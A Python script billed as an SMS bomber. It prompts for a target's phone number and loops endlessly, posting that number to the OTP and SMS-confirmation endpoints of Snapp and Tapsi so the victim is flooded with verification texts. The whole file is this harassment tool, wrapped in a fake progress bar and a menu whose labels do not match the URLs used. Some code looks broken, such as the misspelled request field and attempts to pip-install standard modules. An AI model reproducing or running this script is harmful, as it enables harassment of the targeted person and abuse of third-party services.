#Evil-with-angel-morality



#importing
import requests,time,os



#API
url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
urlt = "https://api.tapsi.cab/api/v2/user"
urll = "https://join.tapsi.ir/smsConfirm?phoneNumber="



#colors
class color:
    red = '\033[91m'
    sabz = '\033[92m'
    sefid = '\033[0m'
    narenji = '\033[93m'
    abi_kamrang = '\033[94m'










#upgrad
uipl = input(color.red+'    Do you want the required libraries to be installed or    updated automatically?     n/y?      ')

if uipl == ('y') or uipl == ('Y'):
    print("")
    print(color.red+" [       ] 0%")
    time.sleep(1)
    print(color.abi_kamrang+" [=======   ] 20%")
    time.sleep(0.6)
    print(color.abi_kamrang+" [============ ] 40%")
    time.sleep(0.5)
    print(color.abi_kamrang+" [================ ] 60%")
    time.sleep(0.8)
    print(color.abi_kamrang+" [==================== ] 80%")
    time.sleep(0.6)
    print(color.abi_kamrang+" [========================= ] 100%")
    os.system('clear')
    os.system('pip install os')
    os.system('pip install requests')
    os.system('pip install time')
    os.system('pip install pyfiglet')
    os.system('pip install colorama')
    os.system('python -m pip install pip')
    os.system('pip install pip')
    print(color.sabz+'.')
    os.system('pip')
    os.system('cls')
    os.system('clear' or 'cls')

if uipl == ('n') or uipl == ('N'):
    time.sleep(2)
    print("")
    print(color.red+" [       ] 0%")
    time.sleep(1)
    print(color.abi_kamrang+" [=======   ] 20%")
    time.sleep(0.6)
    print(color.abi_kamrang+" [============ ] 40%")
    time.sleep(0.5)
    print(color.abi_kamrang+" [================ ] 60%")
    time.sleep(0.8)
    print(color.abi_kamrang+" [==================== ] 80%")
    time.sleep(0.6)
    print(color.abi_kamrang+" [========================= ] 100%")
    os.system('clear' or 'cls')
    print('')
    print('')




    
    


 
 
 
 

#Welcoming
time.sleep(2)
print('''     ''')
#bner
print("#######################################################################")
print("#      @#!                %$            *&               @#!          #")
print("#    #$                  *^ $#         %$ $#           #$             #")
print("#     &^                $#   %$       !@   ^%           $#            #")   
print("#      &%             (#$     *&     $!     &^           &^           #")
print("#       !@           (*)       *&   #$       %$           !@          #")
print("#     *&            ^&          !@ %$        )#         &^            #")
print("#  !@#             $%            #$           @#      &@!             #")
print("#######################################################################")
time.sleep(2.5)
print('''     ''')
print('''    ''')
#List
print(color.red+'    [   1   ]       Sb   snap')
print(color.red+'    [   2   ]       Sb   Divar')
print(color.red+'    [   3   ]       Sb   Tapsi')
print(color.red+'    [   4   ]       Sb   1+2+3')
print(color.sefid+'-----------------------------------------------------------')
print('''     ''')


T = input(color.red+'      Enter number>>>  ')
    



#SmS bomber snap
if T == ('1'):
    target = input("""         Enter phone »»»      """)
    while True:
        pyload = {"ellphone" : target}
        u = requests.post(url, data=pyload )
        print(color.abi_kamrang+"""         SmSbomber !!!""")

#SmS bomber Divar
if T == ('2'):
    target = input("""         Enter phone    »»»      """)
    while True:
        pyloed = {"ellphone" : target}
        u = requests.post(urlt, data=pyloed )
        print(color.sabz+"""        SmS bomber !!!""")
    





#SmS bomber snap,Divar
if T == ('3'):
    target = input(color.sabz+"""         Enter phone »»»      """)
    while True:
        pyload = {"ellphone" : target}
        u = requests.post(urll, data=pyload )
        print(color.abi_kamrang+"""         SmSbomber !!!""")




#SmS Bomber ALL
if T == ('4'):
    target = input(color.sabz+"""         Enter phone »»»      """)
    while True:
        pyloed = {"ellphone" : target}
        u = requests.post(urll, data=pyloed )
        print(color.sabz+"""        SmS bomber !!!""")
        pyload = {"ellphone" : target}
        u = requests.post(url, data=pyload )
        print(color.abi_kamrang+"""         SmSbomber !!!""")
        pyloed = {"ellphone" : target}
        u = requests.post(urlt, data=pyloed )
        print(color.sabz+"""        SmS bomber !!!""")
